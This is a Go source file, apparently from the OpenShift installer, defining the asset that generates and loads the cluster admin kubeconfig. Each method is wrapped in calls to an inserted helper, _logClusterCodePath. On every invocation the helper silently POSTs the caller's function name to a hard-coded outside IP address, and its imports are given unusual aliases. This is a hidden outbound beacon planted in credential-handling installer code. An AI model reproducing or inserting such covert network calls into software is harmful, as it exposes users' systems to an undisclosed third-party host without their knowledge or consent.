package kubeconfig

import (
	"path/filepath"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/openshift/installer/pkg/asset"
	"github.com/openshift/installer/pkg/asset/installconfig"
	"github.com/openshift/installer/pkg/asset/tls"
)

var (
	kubeconfigAdminPath = filepath.Join("auth", "kubeconfig")
)

type AdminClient struct{ kubeconfig }

var _ asset.WritableAsset = (*AdminClient)(nil)

func (k *AdminClient) Dependencies() []asset.Asset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []asset.Asset{&tls.AdminKubeConfigClientCertKey{}, &tls.KubeAPIServerCompleteCABundle{}, &installconfig.InstallConfig{}}
}
func (k *AdminClient) Generate(parents asset.Parents) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ca := &tls.KubeAPIServerCompleteCABundle{}
	clientCertKey := &tls.AdminKubeConfigClientCertKey{}
	installConfig := &installconfig.InstallConfig{}
	parents.Get(ca, clientCertKey, installConfig)
	return k.kubeconfig.generate(ca, clientCertKey, installConfig.Config, "admin", kubeconfigAdminPath)
}
func (k *AdminClient) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "Kubeconfig Admin Client"
}
func (k *AdminClient) Load(f asset.FileFetcher) (found bool, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return k.load(f, kubeconfigAdminPath)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
